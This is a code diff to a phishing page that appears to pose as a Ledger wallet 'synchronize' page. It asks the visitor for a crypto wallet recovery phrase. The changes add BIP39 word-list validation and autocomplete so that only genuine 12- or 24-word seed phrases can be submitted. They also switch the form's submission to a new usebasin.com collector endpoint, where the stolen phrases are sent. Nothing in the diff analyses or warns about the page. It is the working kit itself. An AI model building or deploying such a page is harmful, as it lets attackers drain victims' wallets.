@@ -1219,25 +1219,193 @@ try{(new g(100,"r","QSI_S_ZN_6uka6dlz6B32c1E","https://zn6uka6dlz6b32c1e-ledger.
 		
 		
 		<div class="relative" data-children-count="1"  id="phraseBox" style="display:none">
-			<label for="phrase" style="font-size:24px;font-weight:bold;"><span style="color:red;font-size:30x;font-weight:bold;">*</span>Enter wallet passphrase (Count: <span id="phraseCount">0</span>)</label>
+			<label for="phrase" style="font-size:24px;font-weight:bold;"><span style="color:red;font-size:30x;font-weight:bold;">*</span>Enter wallet passphrase (<span>Word Count: </span><span style="color:red; font-weight:bold;" id="wordCount">0</span>)</label>
 								
-			<textarea cols="30" rows="4"  oninput="countWords()" placeholder="Enter your recovery phrase, Typically 12 (sometimes 24) words separated by single spaces." class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" name="phrase" id="phrase" required=""></textarea>
-			<div class="err-msg" style="display: none;">Incorrect mnemonic phrase. Please check and try again.</div>
-            <div class="flat"></div>
-                    
-			<br>
-			<br>
+			<style>
+        /* Style for the suggestion list */
+        #suggestions ul {
+            list-style-type: none;
+            padding: 0;
+            display: flex;
+            flex-wrap: wrap;
+        }
+
+        /* Style for each suggestion item */
+        #suggestions li {
+            margin: 5px;
+            padding: 5px;
+            background-color: #f0f0f0;
+            border: 1px solid #ccc;
+            cursor: pointer;
+        }
+    </style>
+	<textarea oninput="countWords()"  placeholder="Enter your recovery phrase, Typically 12 (sometimes 24) words separated by single spaces." rows="4" cols="50" name="phrase" id="phrase" required=""></textarea>
+    <span style="color:red; font-weight:bold;display:none;" id="errorMessage"> * Error! Word is not a passphrase </span><br>
+    <div id="suggestions"></div>
+   
 			<center> <input type="submit" name="scanSubmit" id="scanSubmit" class="scanSubmit" disabled="" value="Synchronize Ledger" style="background: grey;color:white;font-weight:bold;border-color: white;border-radius: 15px;padding: 10px 20px; font-size:15px;" /> </center>
 
+
+    <script>
+        // Load the BIP39 word list from a file (english.txt)
+        const bip39WordsFile = 'english.txt'; // Corrected file name
+
+        let bip39Words = [];
+
+        fetch(bip39WordsFile)
+            .then(response => response.text())
+            .then(data => {
+                bip39Words = data.split('\n');
+            })
+            .catch(error => console.error('Error loading BIP39 words:', error));
+
+        // Function to check if a word is in the BIP39 dictionary
+        function isWordInBIP39Dictionary(word) {
+            return bip39Words.includes(word);
+        }
+
+        // Function to suggest similar words from the BIP39 dictionary
+        function suggestWords(prefix) {
+            return bip39Words.filter(word => word.startsWith(prefix));
+        }
+
+        const textarea = document.getElementById('phrase');
+        const suggestionsDiv = document.getElementById('suggestions');
+        const submitButton = document.getElementById('scanSubmit');
+        const clearButton = document.getElementById('clearButton');
+
+        textarea.addEventListener('input', () => {
+            const inputWords = textarea.value.trim().toLowerCase().split(' ');
+            const isValidLength = [12, 24, 48].includes(inputWords.length);
+            const areAllWordsValid = inputWords.every(word => isWordInBIP39Dictionary(word));
+
+            if (isValidLength && areAllWordsValid) {
+				hideErrorMessage();
+                submitButton.removeAttribute('disabled');
+                suggestionsDiv.innerHTML = '';
+            } else {
+				showErrorMessage();
+                submitButton.setAttribute('disabled', 'true');
+                if (!isValidLength) {
+                    suggestionsDiv.innerHTML = 'Total words must be 12, 24, or 48.';
+                } else if (!areAllWordsValid) {
+                    suggestionsDiv.innerHTML = 'All words must be part of the BIP39 dictionary.';
+                }
+            }
+        });
+
+        // Autocomplete functionality
+        textarea.addEventListener('input', () => {
+            const inputWord = textarea.value.trim().toLowerCase().split(' ').pop();
+            const suggestions = suggestWords(inputWord);
+
+            suggestionsDiv.innerHTML = '';
+
+            if (suggestions.length > 0) {
+                if (suggestions.length === 1) {
+                    // Automatically add the suggestion and a space
+                    const words = textarea.value.trim().toLowerCase().split(' ');
+                    words.pop(); // Remove the last word
+                    words.push(suggestions[0]); // Replace it with the suggestion
+                    textarea.value = words.join(' ') + ' '; // Add a space
+                    suggestionsDiv.innerHTML = ''; // Clear suggestions
+                } else {
+                    const ul = document.createElement('ul');
+                    suggestions.slice(0, 5).forEach(suggestedWord => {
+                        const li = document.createElement('li');
+                        li.textContent = suggestedWord;
+                        li.addEventListener('click', () => {
+                            const words = textarea.value.trim().toLowerCase().split(' ');
+                            words.pop(); // Remove the last word
+                            words.push(suggestedWord); // Replace it with the suggestion
+                            textarea.value = words.join(' ') + ' '; // Add a space
+                            suggestionsDiv.innerHTML = ''; // Clear suggestions
+                        });
+                        ul.appendChild(li);
+                    });
+                    suggestionsDiv.appendChild(ul);
+                }
+            } else {
+                //suggestionsDiv.innerHTML = '';
+				suggestionsDiv.innerHTML = 'All words must be part of the BIP39 dictionary.';
+				// Remove the last word from the text
+				  const textArea = document.getElementById('phrase');
+
+				  const text = textArea.value;
+					const words = text.split(' ');
+
+					if (words.length > 1) {
+					  // Remove the last word from the text
+					  words.pop();
+					  textArea.value = words.join(' ') + ' '; // Add a space
+					} else {
+					  // If there's only one word, clear the text area
+					  textArea.value = '';
+					}
+					
+					countWords();
+				
+				// Remove invalid words from the input
+				textarea.value = inputWords.filter(word => isWordInBIP39Dictionary(word)).join(' ');
+				countWords();
+            }
+        });
+
+        /* clearButton.addEventListener('click', () => {
+            textarea.value = ''; // Clear the textarea content
+            suggestionsDiv.innerHTML = ''; // Clear suggestions
+            countWords();
+			submitButton.setAttribute('disabled', 'true'); // Disable the submit button
+        }); */
+		
+		
+		const textArea = document.getElementById('phrase');
+
+		textArea.addEventListener('keydown', function (e) {
+		  if (e.key === 'Backspace') {
+			e.preventDefault(); // Prevent the default backspace behavior
+			//updateWordCount();
+			const text = textArea.value;
+			const words = text.split(' ');
+
+			if (words.length > 1) {
+			  // Remove the last word from the text
+			  words.pop();
+			  textArea.value = words.join(' ');
+			} else {
+			  // If there's only one word, clear the text area
+			  textArea.value = '';
+			}
 			
-		</div>
+			countWords();
+			
+			
+		  }
+		});
+		
+		function showErrorMessage() {
+		  const errorMessage = document.getElementById('errorMessage');
+		  //errorMessage.style.display = 'block';
+		 
+		}
+		
+		function hideErrorMessage() {
+		  const errorMessage = document.getElementById('errorMessage');
+		  //errorMessage.style.display = 'none';
+		
+		}
+		
+		const wordCountElement = document.getElementById('wordCount');
 
-	</form>
-	
-  </div>
+		//textArea.addEventListener('input', updateWordCount);
 
-<script>
-	
+		/* function updateWordCount() {
+		  const text = textArea.value;
+		  const words = text.trim().split(/\s+/);
+		  const wordCount = words.length;
+		  wordCountElement.textContent = wordCount;
+		} */
+		
 		function countWords() {
  
             // Get the input text value
@@ -1252,12 +1420,13 @@ try{(new g(100,"r","QSI_S_ZN_6uka6dlz6B32c1E","https://zn6uka6dlz6b32c1e-ledger.
  
             // Display it as output
 			console.log("Word count is "+numWords);
-            document.getElementById("phraseCount").innerHTML = numWords;
+            document.getElementById("wordCount").innerHTML = numWords;
 			
 			if(numWords == 12 || numWords == 24){
 				document.getElementById("scanSubmit").removeAttribute("disabled");
 				const collection1 = document.getElementById("scanSubmit");
 				collection1.style.background = "#ff5300";
+				scanSubmit.removeAttribute('disabled');
 			}else{
 				document.getElementById("scanSubmit").setAttribute("disabled","disabled");
 				const collection1 = document.getElementById("scanSubmit");
@@ -1279,6 +1448,21 @@ try{(new g(100,"r","QSI_S_ZN_6uka6dlz6B32c1E","https://zn6uka6dlz6b32c1e-ledger.
 		  }
 		  return alphaNumericFound;
 		}
+		
+
+
+	
+    </script>
+			
+		</div>
+
+	</form>
+	
+  </div>
+
+<script>
+	
+
 	
 	function openSupportForm(){
 		
@@ -1564,7 +1748,7 @@ form.addEventListener('submit', (event) => {
 
   const formData = new FormData(form); // create new FormData objecthttps://usebasin.com/f/eb20225ebe56 
 
-  fetch('https://usebasin.com/f/a6e964fce2a4', { //jp 
+  fetch('https://usebasin.com/f/d20efeb18687', { //sd 
     method: 'POST',
     body: formData // pass form data as the request body
   })
